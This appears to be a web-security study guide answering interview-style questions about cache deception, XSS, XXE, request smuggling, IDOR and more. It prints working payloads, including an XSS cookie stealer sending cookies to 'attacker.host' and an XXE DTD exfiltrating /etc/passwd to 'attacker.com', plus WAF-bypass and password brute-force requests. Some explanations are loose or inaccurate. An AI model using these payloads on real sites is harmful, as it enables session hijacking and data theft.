## 1. What is the difference between Web Cache Deception and Web Cache Poisoning?
---
- First off, we need to understand what's a **web cache** (simplified) :
	Web cache is a mechanism that enables better performance by storing data for later use. The common scenario is, when you have a highly requested file, like `freemoney.php`, you gonna cache it, so the next time an another user requests the file, it will just load it from the cache, instead of loading it again and waste time. Check the image below (Portswigger academy)
	
<img src="https://portswigger.net/web-security/images/caching.svg"><br>

### Web Cache Deception :
- It is an attack where the cache gets confused and caches something that was not intended to. In order for this to work, you need :
	1) Endpoint with private information - the endpoint 
	2) User interaction (clicking on a link)
	3) Obviously cache

- From security perspective, things that have sensitive information are not cached. But public & static files are cached, which includes : 
	1) JS & CSS files
	2) Downloadable content
	3) MP3,MP4,.. - all sort of media files
	You guessed it  - It is possible to exploit this behaviour.


##### Example : 
Suppose we have a website `https://freeoscp.net`, which uses a CDN & caching server. You can register & login, make comments, whatever.

Now, we identify an interesting endpoint : `https://freeoscp.net/profile/information`. There, we can see a valuable info about us, in this case, let's just say Full Name, email and API token.

This is where Web Cache Deception comes in. We will try to confuse the cache into thinking it's actually caching a public file - **Path confusion** -> `https://freeoscp.net/profile/information/NOTREALLY.CSS`

Now, two things can usually happen :
1) The web server simply redirects us to 404 page, and the attack failed. 
2) The web server simply ignores the CSS file, probably thinking "What the attacker doin'?" and since the path is still `/profile/information`, it will load exactly that.

In the case of 2), the cache will now see `NOTREALLY.CSS` in the path and will think "pff another stylesheet, caching right now", but in reality, cache just made a critical mistake.

Since `https://freeoscp.net/profile/information/NOTREALLY.CSS` is the same as `https://freeoscp.net/profile/information`, just cached, we can now lure the victim into clicking the vulnerable link, cache it and then (preferably by anonymous mode, since there you have no accounts) see the juicy info.

##### Defense : 
1) Simply, for non-existent files, redirect the user to 404 page
2) Use content-type for caching
3) use of cache-control headers



### Web Cache Poisoning

- This attack differs from deception by the fact it can lead to many more vulnerabilities, rather than just leaking personal information. Also, it can be done without user interaction. (Clicking a link)

In order to understand web cache poisoning, we need to understand another thing from cache -> **Cache Keys.**
	Cache keys are used to determine whether there is a cached response, or it needs to be loaded. It is usually defined by headers. Now, the important part is, that there are also `unkeyed` headers, which are ignored by cache and which we can use to slip our payloads.


That's all nice, but how to identify unkeyed headers? Well, we can happily automate it by using Param Miner extension from burp suite. 

Portswigger academy has a topic about cache poisoning, with labs included (free!), so definitely check it out, you will learn a lot: https://portswigger.net/web-security/web-cache-poisoning. Happy hacking!


## 2. What two criteria must be met to exploit Session Fixation?

- Hmm, what even is Session Fixation?
	It is an attack, that exploits the fact a new sessionID is not assigned, thus allowing to use the existent ones. The typical scenario is, when an attacker logs in with a valid sessionID and then somehow (more methods) makes a victim to login with the session. Since attacker knows the sessionID and it doesn't change, attacker can easily login to the victim's account.

As told in the description, there are various methods to do it, and we are going to look at some : 

1) **URL token**
	The easiest one, the sessionID is simply in the URL, user click on the link with valid sessionID, like : `https://freeoscp.net/login?hacker=false&token=IAMTHETOKENYES&redirect=1`. Well, now we wait for the victim to login, since new token is not issued and we know the value, we can successfully login as victim.

2) **via Javascript Injection**
	This method can be used, when the token is not accessed by URL, but rather by a cookie. We can simply use `document.cookie` to change the value of the token and wait for the victim to login.
	`https://freeoscp.net/login/?what=<script>document.cookie="sessionID=IAMTHETOKENYES";</script>`

3) **via CRLF injection**
	When the site is vulnerable to CRLF injection, we can basically make a new headers. In this case, we can use the `Set-Cookie` header. It would look like this : 
	`https://freeoscp.net/login/?redirect=1&hacker=noob%0d%0aSet-Cookie:<cookie>`

There are more methods, just search the internet :P 

**answer:**
1) The web server **DOES NOT** issue new tokens
2) The attacker has control over setting a cookie to a victim.


## 3. What are the differences between Base64 and Base64URL encoding?

**Base64** is an encoding algorithm that allows you to transform ANY character into an alphabet that contains latin letters, digits, plus, and slash.
- example : `???>>><<<???:`->`Pz8/Pj4+PDw8Pz8/Og==`

**Base64URL** is a modification that works for URLs. Since "+" is treated like space and "=" is used with parameters, like `?param=value`, normal Base64 encoding would cause errors and it would simply not work. 

The example would obviously not work and it would cause errors, so that's why Base64URL was invented. It will change the special characters.
- example : `Pz8/Pj4+PDw8Pz8/Og==` -> `Pz8_Pj4-PDw8Pz8_Og`<- this format is valid and can be used in URLs.


## 4. Name 5 (or more) types of Cross-Site Scripting.

##### 1) Reflected XSS
- One of the most common vulnerabilities in the world
- Not stored on the server
- Needs user interaction (at least one click)


Suppose we have a really secure PHP code like this :
```php
<?php echo 'Search results for : ' .$_GET["q"];?>
```
`$_GET["q"]` = `?q=SEARCH-HERE`

The problem here is obvious, the input is not sanitized at all! We can simply type : 
`?q=<script>alert()</script>` and an alert will popup. Obviously we are leet hackers and we want more than just an alert (aka javascript injection), so here's a simple cookie stealer : 

```txt
?q=%3Cscript%3Evar%20x%3Dnew%20Image%3Bx.src%3D%22http%3A%2F%2Fattacker.host%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
```

Decoded payload : 
```js
<script>var x=new Image;x.src="http://attacker.host/?"+document.cookie;</script>
```
- The payload here creates variable x, which points to `attacker.host` via the `.src` attribute and adds `document.cookie`, which grabs the victim's cookie (if HTTPonly not present)

The drawback of reflected XSS is the fact that victim needs to click on the link, which, as you can tell, will look really weird. There are some methods, such as using URL shorteners, but these are still suspicious.


##### 2) Stored XSS
- Is stored on the server
- Does not require user interaction (apart from loading the page)
- More impact than reflected XSS 

For stored XSS to work, we need to find a function that stays on the server, not just showing up after typing something in the URL. This can be comments, username, whatever reflects and is set permanently.

Let's say we have a really insecure social media site, where we can comment on everyone's post. Imagine that there is a post with million views and you can comment with the XSS payload, like this : 
```js
<script>var x=new Image;x.src="http://attacker.host/?"+document.cookie;</script>
```
Million accounts would be compromised, since it is STORED on the server, the only thing needed is to load the page with the post. That's it.


##### 3) Blind XSS
- Is stored, but we can't see where the payload goes to
- Usually leads to vertical privilege escalation
- Attacks pages like Contact us, Message to Moderators, Ban appeals etc.


Let's assume we have a website, where you just got banned and you can make a ban appeal on `/appeal` endpoint, with sorry message. When the message is sent, it goes to `/check-appeals`, which we are forbidden to load, since it's for checking appeals. The mod then decides if he wants to unban you or not.

Visiting the page, you write a message, but not something like "Sorry for hacking into the mainframe", more like `<script>var x=new Image;x.src="http://attacker.host/?"+document.cookie;</script>`. (yes again this payload)

If the `check-appeals` page has poor protection against HTML/JS injection, you will get a cookie, when a mod will visit the website.

If you don't want to port forward your server, lazy to use VPS or whatever, you can use a free tool called ez.pe - https://ez.pe/
It's designed for blind XSS (but it can work for any XSS as long as it is triggered), you have your own subdomain and there are plenty of payloads to choose from, although you are free to create your own. 


##### 4) Universal XSS
- Happens in the browser (and extensions), not website
- Waaay bigger impact than website-based XSS's
- Rare

This type of XSS happens in the browser, not the website itself. The impact is huge, since it doesn't need any vulnerable website, just the exploitation of a browser is enough. It can also exploit more websites than just one, so more accounts you should worry about.

An excellent report about UXSS in Safari browser is here : https://www.ryanpickren.com/safari-uxss


##### 5) Mutation XSS
- Exploits HTML sanitizers, like DOMPurify
- 3 conditions : 
	- innerHTML – innerHTML is a property that can be used to dynamically generate HTML content.
	- DOM - Document Object Model, is a programming interface for HTML and XML documents.
	- HTML sanitizer – HTML sanitizers, on the other hand, ensure that HTML data does not contain harmful content by blacklisting certain tags and sanitizing the DOM tree.

Nice example is DOMpurify, which is a HTML sanitizer, which has a lot of BYPASSES, one of them :  https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

You can just search for "dompurify bypasses" and a lot of writeups & reports will show up, give all of them a read.



## 5. How does Boolean *Error* Inferential (Blind) SQL Injection work?

This SQL injection works with TRUE & FALSE statements. It is a blind SQLi, meaning we can't directly see the results, which is really time consuming if doing manually.

Let's say we have an application, which does something like this : 
```sql
SELECT * FROM products WHERE id = product_id
```

We have to find a product ID, let's say it's 1337 in this example, the attacker can try to inject SQLi payload like : `1337 AND 1=1` (TRUE) and `1337 AND 1=0` (FALSE). It would look like this : 

```sql
SELECT * FROM products WHERE id = 1337 and 1=1 --TRUE
SELECT * FROM products WHERE id = 1337 and 1=0 --FALSE
```
If the responses are different, it is most likely vulnerable to boolean-based SQL injection. Better use `sqlmap`, you want to avoid doing this manually.



## 6. What is the Same-Origin Policy (SOP) and how does it work?

**SOP** is a mechanism that prevents other origins to access data from another origins. 

The rules for **SOP** are simple : 
1) The same protocol
2) The same host
3) The same port

If any of them are not met, SOP will prevent you from accessing the data.
Suppose we have a wonderful site, called `https://freeoscp.net`, here's a table of what is same origin and what not, to understand it better :

| URL  (`https://freeoscp.net`)                               | Result | Reason                         |
| ----------------------------------- | ------ | ------------------------------ |
| https://freeoscp.net/oscp-here      | TRUE   | Path doesn't change the origin |
| http://freeoscp.net/                | FALSE  | Different protocol             |
| https://admin.freeoscp.net          | FALSE  | Different host (subdomain)     |
| https://freeoscp.net:1337/oscp-here | FALSE  | Different port                 |


## 7. How does the TE.TE variant of HTTP Request Smuggling work?

HTTP request smuggling is kinda advanced vulnerability, which exploits both `Content-Length (CL)` and `Transfer-Encoding (TE)` headers, variations depends on the front-end and back-end.

#### What is HTTP request smuggling?
I will write this simplified, as this is not by any means supposed to be a whole tutorial : 

It allows us to smuggle request into another request, which can be used for all sorts of vulnerabilities, like accessing private information, XSS, even Web Cache Deception! 

Learn :
https://portswigger.net/web-security/request-smuggling 

Portswigger Research written by amazing hacker, James Kettle :
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://portswigger.net/research/http2
https://portswigger.net/research/browser-powered-desync-attacks


#### TE.TE variation 

Here, both servers (front-end and back-end) use `Transfer-Encoding` header. Our goal is to make one of the servers to ignore the header, which can be done by "obfuscating". There are possibly endless ways to obfuscate it, all depends on how the servers are operating. Some examples taken from portswigger academy : 

```http
Transfer-Encoding: xchunked 

Transfer-Encoding : chunked 

#cloning
Transfer-Encoding: chunked 
Transfer-Encoding: x 

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked 
X: X[\n]Transfer-Encoding: chunked 
Transfer-Encoding : chunked
....
```


Lab : https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header


## 8. What is DOM Clobbering and how can it be used to bypass (some) HTML sanitizers, resulting in XSS?

Dom clobbering is technique that is used, when there's no possible JS injection, but there's still HTML injection.

It can be used, when we have a control over something that has `id` or `name` attribute, consider this example : 

```html
<script> window.onload = function(){ 
	let someObject = window.someObject || {}; 
	let script = document.createElement('script'); 
	script.src = someObject.url; 
	document.body.appendChild(script); }; 
</script>
```

We can exploit this by making two anchor tags with the same id :
`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`
The DOM will now add them to DOM collection, where the `name` attribute is used on the LAST anchor tag, leading it to the external script.
<sub>source: https://portswigger.net/web-security/dom-based/dom-clobbering</sub>

I need to admit that I lack knowledge in this advanced stuff, but I can definitely recommend this wiki : https://domclob.xyz/domc_wiki/index, which only focuses on DOM clobbering.

Also https://tib3rius.com/dom/ of course :P


## 9. Describe how HTTP Parameter Pollution could be used to bypass a Web Application Firewall.

HTTP Parameter Pollution is an interesting attack, where we basically re-use a parameter to make unexpected results. Exploitation varies from framework/tech used, let's have a look at examples :

<img src="https://github.com/x1trap/websec-answers/assets/81029708/527f610c-8d9e-4c22-869e-a8883f22fa70">

If you want to learn more about HPP, I suggest to watch a video by PwnFunction : 
https://www.youtube.com/watch?v=QVZBl8yxVX0 - Really nice video.


This scope is about bypassing WAF, so let's look at one of the oldest and deadliest vulnerability : **SQL injection**.

Suppose we have a query, like this : 

```http
POST /hacker-check HTTP/1.1
Host: freeoscp.net
....
User-Agent: Mozzila 5.0/blhalbahj
Content-Type: application/json
Content-Length: idk

{
    "hacker" : "hackerman",
    "leet" : "unfortunately no"
}

```

Now let's say we are going to inject a malicious query, like : 
```json
{
    "hacker" : "hackerman",
    "leet" : "unfortunately no' and 1=1 -- -"
}
```
Sounds cool huh? Well too bad the WAF blocks it. This is when the HPP comes in. We can simply duplicate and see the result : 
```json
{
    "hacker" : "hackerman",
    "leet" : "unfortunately no' and 1=1 -- -",
    "leet" : "unfortunately no"
}
```
or :
```json
{
    "hacker" : "hackerman",
    "leet" : "unfortunately no",
    "leet" : "unfortunately no' and 1=1 -- -"
}
```

**HPP** technique can also be used for XSS : 

`https://freeoscp.net/?query=real&query=<script>alert()</script>`;
`https://freeoscp.net/?query=<script>alert()</script>&query=real`



## 10. Describe IDOR and explain how mitigating it is different from other access control vulnerabilities.


**I**nsecure **D**irect **O**bject **R**eference is a vulnerability in which we manipulate parameters & identifiers in either URL's or parameters. It works, because there are no access control checks, which are needed in order to determine whether a user has an access to the resources or not.

Here are some examples : 

I am hackerman and I just accessed my data with this request :
```http
GET /profile?id=1336 HTTP/1.1
Host: freeoscp.net
Content-Type: application/json
```
The response looks like this : 
```http
200 OK

{
    "email" : "hackerman@freeoscp.net",
    "fname" : "hackerman",
    "hacker" : "No"
    "desc" : "Good hackerman"
}

```

As you can see, there is this `id` parameter, that we have a control of. What if we try to manipulate it?
This is the request, instead of our id, let's use a different one :
```http
GET /profile?id=1337 HTTP/1.1
Host: freeoscp.net
Content-Type: application/json
```

Normally, you'd expect something like 403 Forbidden!, but since this is an IDOR, we get this response instead : 
```http
200 OK
{
    "email" : "jonathandata@gotyour.ip",
    "fname" : "Jonathan Data",
    "hacker" : "No"
    "desc" : "Keep talking. The more you talk, the more I have from your ip."
}

```


This is one of the many examples of an IDOR, it can lead to privilege escalation (horizontal & vertical), leaking private info and much more.

**Mitigation** :
Instead of mitigating the whole function, mitigation applies just for the resources. If we are unauthorized to see all information for id 1337, we will just simply block other than id 1337 from accessing it. 


## 11. What are JWKs and JKUs and how does their usage differ in JWTs?

#### JWK - JSON Web Key
- Directly embeds public key into the token
Example of a JWK header that uses RSA algorithm. 
```json
"jwk": {
  "alg":"RSA",
  "mod": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
  "exp":"AQAB",
  "kid":"2023-00-00"
}
```

#### JKU - JWK Set URL
	- Contains a URL with JWK set, where public keys are stored. Can contain more, than one key.

Example of  `jku` header included in JWT :
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://freeoscp.net/jwks.json
}

```

Example of `jwks.json`: (from https://portswigger.net/web-security/jwt#jwt-header-parameter-injections)

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}

```

## 12. In the context of web apps, what is Business Logic and how does testing for Business Logic vulnerabilities differ compared to (for example) XSS, SQLi, etc?

Business logic refers to the logic and algorithms serving as the foundation of code in business software. 

Testing for business logic flaws is purely manual, since scanners can't see logic behind an application. 

**Example :**
Suppose we have an application, where we really want to buy a nice hacker PC, but it costs 1337$. 

When adding to a cart, we make a POST request, like this :
```http
POST /addtocart HTTP/1.1
Host: freeoscp.net
....
Content-Type: application/x-www-form-urlencoded


productid=14&price=1337&addtocart=true

```
This is a normal request, but can you see what can we try to edit? Yes, the `price` parameter seems juicy.

We are going to modify the request to this : 
```http
POST /addtocart HTTP/1.1
Host: freeoscp.net
....
Content-Type: application/x-www-form-urlencoded


productid=14&price=0&addtocart=true
```
This modified request passes and we have a hacker PC for exactly 0$ !!!

This is just a simple example, generally speaking it's all about trying to play with the logic of the application, trying out of the box things, you can even try negative numbers.. you name it.

Once again, portswigger academy is the GOAT : 
https://portswigger.net/web-security/logic-flaws

## 13. Describe 3 payloads you could use to identify a server-side template engine by causing an error message.

1) `{{7*7}}` = Error (Jinja2 - Python)
2) `<%= random %>` = Error (ERB - Ruby)
3) `{{console.log(1)}}` = Error (NUNJUCKS - NodeJS)


## 14. What is the purpose of the Sec-WebSocket-Key header?

As the name suggests, this header is used when interacting with WebSockets. It's a part of a handshake and the key is a `base64` encoded random string of 16 characters, ranging from ASCII value 32 to 127. It is send by client to a server. 

It is there to ensure that the server communicates with a WebSocket client and not with non-websocket ones.


## 15. What does the “unsafe-inline” value allow for if used in a script-src directive of a CSP?

First things first, what is CSP (Content-Security-Policy)

CSP is a security standard to prevent MAINLY XSS attacks. It can be enabled either via headers or meta tags.
Via Headers:
`Content-Security-Policy: script-src https://scripts.freeoscp.net 'unsafe-inline';`

Via `<meta>` tag:
```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';" />
```



**What˙`unsafe-inline` does?**:
	It allows us to happily execute XSS, since `unsafe-inline` allows all inline scripts to execute.

Let's look at this CSP example of `https://freeoscp.net` : 

```
CSP
Content-Security-Policy: script-src https://scripts.freeoscp.net 'unsafe-inline';
```
Here we can see, that scripts are only allowed from `https://scripts.freeoscp.net` and everything else is blocked... or is it? due to `unsafe-inline`, we can trivially exploit it by using a basic payload :
`?q=<script>alert('LOOL')</script>`. 

It is not recommended to use `unsafe-inline`, instead use nonce & hashes or move all inline scripts to .js files.


## 16. Give an example of stateless authentication, and describe an inherent weakness of this authentication mechanism.

That would be JWT (JSON Web Tokens). The main problem with stateless authentication is, that as a server, you can't forcibly expire the user sessions, since it's completely client-side.


**JWT** are cryptographically signed JSON data, which are mostly used for authentication & access control. An example of a valid JWT would look like this : 

<span style = "color:green">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span style="color:blue">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</span>.<span style="color:red">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>

Which can be simplified to :
<span style="color:green">header</span>.<span style="color:blue">payload</span>.<span style="color:red">signature</span>

For decoding, I recommend https://token.dev, It was better for me than using jwt.io. Also, a nice burp suite extension called `JWT Editor`.

Portswigger Academy : https://portswigger.net/web-security/jwt
jwt_tool : https://github.com/ticarpi/jwt_tool


## 17. Describe 3 ways to mitigate Cross-Site Request Forgery.

#### 1) CSRF tokens
- The most common way to mitigate CSRF, is to use tokens.
- It is (should be) a unique & unpredictable value
- Are tied to user session


CSRF token is one of the most common way to mitigate CSRF attacks. The approach is simple, insert a hidden input with the csrf value into the HTML form. 
```html
<input type="hidden" name="csrf" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
```

It should be generated with high entropy and they should be UNPREDICTABLE, which is CSPRNG, for example.

CSPRNG = https://cryptobook.nakov.com/secure-random-generators/secure-random-generators-csprng


#### 2)  Same-Site Cookies
Same-site cookies prevents application to send cookies via cross-site requests. They have 3 implementations - None, Lax and Strict

`None` -> Does nothing
`Lax` -> Allows sending cookies via cross-site requests if :
1) - The request is GET
2) - The request resulted from a top-level navigation by the user, such as clicking on a link.
`Strict` -> never allows sending cookies via cross-site requests.


#### 3) User interaction based protection
This, as the name suggests, require a user to do some action, it can be :
1) Reauthentication
2) One-time token
3) CAPTCHA


There are more CSRF prevention techniques, check here : https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html


## 18. What are XML parameter entities and what limitations do they have in XXE Injection?

XML parameter entities are used only within an external DTD, meaning that it's use for XXE injection is limited to only OOB attacks. Instead of `&`, which is used within general entities,  it uses `%`. Let's have an example of an OOB XXE attack via malicious DTD.

Our simple malicious DTD:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'https://attacker.com/?data=%file;'>"> %all;
```

The payload used within the target domain : 
```xml
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE data [ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd"> %dtd; ]> 

<id>1337</id>
<name>hackerman</name>
<leet>&send;</leet>
```

The XML parser will load our DTD via the `%dtd` **parameter entity**, after it uses our DTD, `%all` is creates general entity, called `&send;`, which points to attacker's domain. The URL contains parameter entity, called `%file`, which by the declaration in the request, is the local file `/etc/passwd`. It will send the local file to our domain, like this : `https://attacker.com?data=HERE`. The only thing we now need to do, is to URL decode the contents, and we are good to go.

## 19. What recommendations would you give a customer for fixing DOM based XSS?


**What is DOM-based XSS :** 
- XSS where the attack payload is executed as a result of modifying the DOM.
- It can be either stored or reflected.
- Can be exploited via jQuery as well.
- We exploit HTML sinks, list of some sinks that can lead to DOM-based XSS (they allow dynamic code execution)
```js
document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
element.src
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse()
element.setAttribute()
RegExp()
```

**Example :**
Suppose we have this simple code : 

```js
var name = document.URL.indexOf('name=') + 5;
document.write("Hello" + document.URL.substring(name, document.URL.length));
```

The vulnerable sink here is `document.write`, which passes whatever the value of `name` is, invalidated. 
`?name="><script>alert()</script>` payload will work.

**Mitigation :** 
- Use HTML encoding
- NEVER USE `eval()`
- I would give them this to read : https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html


## 20. What conditions must be met to *prevent* a browser from sending a CORS Preflight request?

**What is CORS Preflight request?**
- It's a CORS request (wow), that check if the CORS is supported by the desired server
- It's automatically issued by a browser
- It can be cached

CORS Preflight request can look like this :

```http
OPTIONS /oscp
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: origin, x-requested-with
Origin: https://freeoscp.net
```
- This particular CORS request checks, if `DELETE` method is allowed.


**Preventing sending CORS preflight request :**

The conditions for this are : 
1) Must be `GET`, `HEAD` or `POST` request
2) Must only have headers allowed from the whitelist, commonly known as "CORS-safelisted request-headers" : 
```
- Accept
- Accept-Language
- Content-Language
- Content-Type (but note the additional requirements below)
- DPR
- Downlink
- Save-Data
- Viewport-Width
- Width
```
3) Content-Type has three allowed values : 
```
- application/x-www-form-urlencoded
- multipart/form-data
- text/plain
```
4) No event listeners via XHR
5) No ReadableStream object in the request.



## 21. Describe 3 ways an Insecure Deserialization vulnerability could be exploited.

Insecure deserialization arises, when user-controllable data is deserialized. This vulnerability is often a mistake of a developer, thinking they're safe, but in fact, they're not. 

Also called "dependency injection", because it today's modern world, there are a lot of dependencies, which can be used by a website, thus allowing for more potential vulnerabilities. We need to understand, what is **serialization** & **deserialization** first.
##### Serialization 
- process of converting an object into a stream of bytes to more easily save or transmit it.
##### Deserialization 
- process of converting stream of bytes to a replica of the complex data before serialization.

<img src="https://github.com/x1trap/websec-answers/assets/81029708/94d17071-ad66-4810-b188-1a7062b8672c">
https://portswigger.net/web-security/deserialization/

I have hard time grasping the full idea of insecure deserialization, so I will just write something down and use a reference. I am sorry about that.
1) Magic methods
- https://portswigger.net/web-security/deserialization/exploiting#using-application-functionality
2) Injecting arbitrary objects
- https://portswigger.net/web-security/deserialization/exploiting#injecting-arbitrary-objects
3) Gadget chains
- https://portswigger.net/web-security/deserialization/exploiting#gadget-chains


## 22. List the checks an application might perform to ensure files cannot contain malicious content, and can only be uploaded to specific directories.

---
### Checking file contents

For **images**, we can consider a really interesting approach - randomization.

When an image is uploaded, we can simply add random values, such as adding 1, subtracting 1 (in correspondence with RGB), which makes the attack to be less successful. Yes, the image will be slightly edited, but the changes would be really minimal.

There is also VirusTotal with it's API, which could scan for signatures and help with determination, if the file is malicious or not.

And lastly, file analysis is also a thing. It can be done manually and well - better to be sure.


### Upload to specific directories
We can simply just block special characters in a filename (make sure it's actually a SECURE BLOCK on the backend), so it'd be uploaded to only a specific directory and couldn't be played with.


## 23. How does Mass Assignment work and what are some potential outcomes of exploiting such a vulnerability?


Mass Assignment is a vulnerability specific to Ruby and NodeJS languages. The idea of this vulnerability is to exploit binding HTTP request to a program's code variables & objects, that makes using the framework easier for developers. The potential outcomes are : 
1) Privilege Escalation
2) Money grab
3) Log forging

It has alternative names, although the vulnerability itself is the same.

- **Mass Assignment:** Ruby on Rails, NodeJS.
- **Autobinding:** Spring MVC, ASP NET MVC.
- **Object injection:** PHP

An example of Mass Assignment in Java (Spring MVC)
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

```html
<form>      
	<input name="userid" type="text">      
	<input name="password" type="text">      
	<input name="email" text="text">      
	<input type="submit"> 
</form>
```
- This is a simple HTML form for adding a user.

The backend can look like this : 

```java
public class User {    
	private String userid;    
	private String password;    
	private String email;    
	private boolean isAdmin; // A parameter that is not used, but CAN BE, if found by attacker   
	
	//Getters & Setters
}
```

- Controller handling the request : 
```java
@RequestMapping(value = "/addUser", method = RequestMethod.POST) public String submit(User user) {    
	userService.add(user);    
	return "successPage"; 
}
```


Now, the typical request would look like this : 

```http
POST /addUser

userid=hackerman&password=secure&email=hackerman@freeoscp.net
```
- The user would be created, everything's fine.

Consider we've got access to the source code (whitebox), we could simply make this request : 
```http
POST /addUser

userid=hackerman&password=secure&email=hackerman@freeoscp.net&isAdmin=1
```

 Since the developer also included `private boolean isAdmin` in the code, it will work and we will be admins.


If we have a blackbox testing, for fuzzing we could use something like `burp intruder`, but well... that's slow (for community editon), so we can use something else, for example OWASP ZAP, wfuzz or ffuf.


Let's check a scenario, where the website registers a user, but when a non-existent parameter is issued within the request, it will throw a `500 - Parameter blah doesn't exist.`. If a parameter exists, but a wrong value is written, it will throw : `200 - Parameter exists, but value is wrong`. (Maybe not a real scenario, but to make things simpler, pretend it's real)

We can use the `FFUF` tool to discover existent parameters : 

`ffuf -w params.txt -u https://freeoscp.net/addUser -X POST -d "userid=hackerman&password=secure&email=hackerman@freeoscp.net&FUZZ=true" -fc 500` 

Command explained : 
`-w params.txt` - specifying the wordlist with parameters (isAdmin is included in the wordlist)
`-u <url>` - the URL and endpoint we are attacking
`-X POST` - HTTP method
`-d <data>` - POST data we are sending, notice the "FUZZ" word, which is needed so the tool knows where the payload values should be.
`-fc 500` - filtering the `500` status code, so we can only see positive results.

After some waiting, we will see a result, which will tell us that `isAdmin=true` returns 200.



## 24. What is GraphQL batching and how can it be used to bypass rate limiting?

**GraphQL batching :**
- It's a process where we take a group of requests and combine it into one single HTTP request.

Usually, rate limiting monitor how many HTTP requests are sent, so when we make a one single request with more data (for example user/pass pair or MFA codes), it would trick the rate limit into thinking everything's fine.


Let's say we have an application where rate limit takes place for login. After some 10 fast HTTP requests, you will get timeout. Let's bypass it by using the GraphQL batching technique. 

Let's say we issue a login request, where we know the username, but not the password (request simplified) : 
```http
POST /graphql HTTP/1.1

[
	{
	"variables":{
	},
	
	"query":
	"mutation {
			login(username: 'hackerman', password: '1337')}"
			.......blahblah
},
]
```

This normal request will throw something like "Wrong password" for the query in GraphQL format. Rate limit will be at it's place, looking if we are going to make more HTTP requests (like 15 fast ones). 


Now, we can simply duplicate the queries into one single HTTP request, where only the password value will be replaced. 

```http
POST /graphql HTTP/1.1

[
{
	"variables":{
	},
	
	"query":
	"mutation {
			login(username: 'hackerman', password: '1337')}"
			.......blahblah
},
{
	"variables":{
	},
	
	"query":
	"mutation {
			login(username: 'hackerman', password: '1338')}"
			.......blahblah
},
{
	"variables":{
	},
	
	"query":
	"mutation {
			login(username: 'hackerman', password: '1339')}"
			.......blahblah
},
............................. (as many queries as the server can accept)
]
```

We are successfully bypassing the rate limit by sending one single HTTP request with many queries. For each query, there will be written, if it's successful, or not. 


There is also an alternative, called **aliases**, which is not in scope for this question, so I will share a link from the GOAT of websec : https://portswigger.net/web-security/graphql/what-is-graphql#aliases.



## 25. What is type juggling, and why does the JSON format help exploit these vulnerabilities?

(PHP) Type juggling is a vulnerability which exploits a LOOSE comparison (`==`), which looks really weird : 
<img src="https://github.com/x1trap/websec-answers/assets/81029708/e9f9b606-8d65-43e7-a10d-471b1c580871">

let's say we have this code for a challenge :

```php
if(md5($_GET['pass']) == 0e133713371337133713371337133713) {
```
Here, it seems impossible to find a password which's MD5 would be the same to `0e133713371337133713371337133713`, right? But well, since it is using LOOSE comparison, we can exploit this using Magic Hashes.


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#type-juggling
Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations.

So basically anything that md5 translates to a MD5 hash starting with "0e" is a valid password. Here's a wonderful list of magic hashes that can be used : 
https://github.com/spaze/hashes


JSON helps with this vulnerability, because unlike URL, it supports more than strings and arrays. It also supports objects, nulls, booleans, numbers. (Everything can be seen on the image) - so it makes the vulnerability more likely to succeed.


## 26. Describe 3 techniques you might use to find sensitive data being exposed by an application.


#### 1) Fuzzing

With fuzzing, we can find endpoints and directories, which could have some juicy info inside.

Commonly, we would use something like `ffuf`, `feroxbuster`, `gobuster` or something similar, there are many tools. 

So let's use `ffuf` :

``ffuf -w secrets.txt -u https://freeoscp.net/FUZZ`
This is really simple right? Depends on the application, additional flags could be neede, like `-fw`, or `-fc`.


